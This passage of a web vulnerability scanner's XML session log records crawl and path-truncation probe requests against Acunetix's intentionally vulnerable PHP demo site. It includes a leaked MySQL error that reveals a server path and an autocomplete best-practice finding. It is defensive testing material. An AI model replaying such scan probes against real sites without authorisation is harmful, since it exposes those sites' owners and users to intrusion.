]]></RawResponse><Request id="8C8A2ED0B1865A85196EE48C7C6ED8C5"><Method>GET</Method><Path>/AJAX/</Path><File>infoartist</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/AJAX/infoartist.php?id=3</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="8C8A2ED0B1865A85196EE48C7C6ED8C5";PSID="DFFD46A7DFB364CD49AE94CB85E0CE16";SessionType="PathTruncation";CrawlType="None";AttackType="None";OriginatingEngineID="398bfe9e-1b77-4458-9691-603eea06e341";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="0";Engine="Path+Truncation";SmartMode="4";tid="68";tt="11";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="29";smi="0";sc="1";ID="7a47557b";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="152b8904";sc="1";tid="40";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<iteminfo>
Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/AJAX/infoartist.php on line 7
</iteminfo>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:47:45 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/xml;charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>148</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="8AB46678D45BFB0E0CBE10DCFD48EF15"><URL>http://php.vulnweb.com:80/search.php?test=query</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues><Issue id="01b826b0-df87-46df-9afa-2f588ce25555"><CheckTypeID>Best Practices</CheckTypeID><EngineType>11546</EngineType><AttackHTTPRequest /><VulnerabilityID>5597</VulnerabilityID><Severity>0</Severity><Name>Form Auto Complete Active</Name><Classifications><Classification kind="CWE" identifier="CWE-525" href="http://cwe.mitre.org/data/definitions/525.html">CWE-525: Information Exposure Through Browser Caching</Classification><Classification kind="7PK" identifier="Security Features" href="https://vulncat.fortify.com/">Security Features</Classification><Classification kind="7PK Category" identifier="Privacy Violation: Autocomplete" href="https://vulncat.fortify.com/">Privacy Violation: Autocomplete</Classification></Classifications><DetectionSelection><Location offset="2536" length="46" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[Most recent browsers have features that will save form field content entered by users and then automatically complete form entry the next time the fields are encountered. This feature is enabled by default and could leak sensitive information since it is stored on the hard drive of the user. The risk of this issue is greatly increased if users are accessing the application from a shared environment. Recommendations include setting autocomplete to "off" on all your forms.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText /></ReportSection><ReportSection><Name>Execution</Name><SectionText /></ReportSection><ReportSection><Name>Fix</Name><SectionText /></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><b>Microsoft:</b><br /><a href="http://msdn.microsoft.com/en-us/library/ms533032(VS.85).aspx#security">Autocomplete Security</a>]]></SectionText></ReportSection></Issue></Issues><RawRequest id="8AB46678D45BFB0E0CBE10DCFD48EF15"><![CDATA[POST /search.php?test=query HTTP/1.1
Referer: http://php.vulnweb.com/
Content-Type: application/x-www-form-urlencoded
Content-Length: 27
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="8AB46678D45BFB0E0CBE10DCFD48EF15";PSID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="Crawl";CrawlType="Form";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="action";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="65";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="4d7d0c06";
X-Request-Memo: ID="ebc045a5";sc="1";tid="35";
Cookie: CustomCookie=WebInspect0

searchFor=12345&goButton=go]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:32 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 4774

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>search</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- here goes headers headers -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	<h2 id='pageName'>searched for: 12345</h2></div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></RawResponse><Request id="8AB46678D45BFB0E0CBE10DCFD48EF15"><Method>POST</Method><Path>/</Path><File>search</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery>test=query</FullQuery><FullPostData>searchFor=12345&amp;goButton=go</FullPostData><XMLPostData /><MultiPartPostData /><RawASCIIPostData /><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries><Query><Name>test</Name><Value>query</Value></Query></Queries><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/</Value></Header><Header><Name>Content-Type</Name><Value>application/x-www-form-urlencoded</Value></Header><Header><Name>Content-Length</Name><Value>27</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="8AB46678D45BFB0E0CBE10DCFD48EF15";PSID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="Crawl";CrawlType="Form";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="action";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="65";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="4d7d0c06";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="ebc045a5";sc="1";tid="35";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>search</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- here goes headers headers -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	<h2 id='pageName'>searched for: 12345</h2></div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:32 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>4774</Value></Header></Headers><SetCookies /><Forms><Form><Action>search.php?test=query</Action><Method>post</Method><Name /><OnSubmit /><InputFields><InputField><Name>searchFor</Name><Value /><Size>10</Size><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>goButton</Name><Value>go</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas /><SelectFields /></Form></Forms></Response></Session><Session requestId="062EEE62272B86C69078954DCBCC3DA6"><URL>http://php.vulnweb.com:80/search.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="062EEE62272B86C69078954DCBCC3DA6"><![CDATA[GET /search.php HTTP/1.1
Referer: http://php.vulnweb.com/search.php?test=query
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="062EEE62272B86C69078954DCBCC3DA6";PSID="8AB46678D45BFB0E0CBE10DCFD48EF15";SessionType="PathTruncation";CrawlType="None";AttackType="None";OriginatingEngineID="398bfe9e-1b77-4458-9691-603eea06e341";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="0";Engine="Path+Truncation";SmartMode="4";tid="72";tt="11";
X-RequestManager-Memo: sid="45";smi="0";sc="1";ID="cbe53fb8";
X-Request-Memo: ID="f22a6b89";sc="1";tid="48";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:46:53 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 4732

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>search</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- here goes headers headers -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></RawResponse><Request id="062EEE62272B86C69078954DCBCC3DA6"><Method>GET</Method><Path>/</Path><File>search</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/search.php?test=query</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="062EEE62272B86C69078954DCBCC3DA6";PSID="8AB46678D45BFB0E0CBE10DCFD48EF15";SessionType="PathTruncation";CrawlType="None";AttackType="None";OriginatingEngineID="398bfe9e-1b77-4458-9691-603eea06e341";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="0";Engine="Path+Truncation";SmartMode="4";tid="72";tt="11";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="45";smi="0";sc="1";ID="cbe53fb8";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="f22a6b89";sc="1";tid="48";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>search</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- here goes headers headers -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
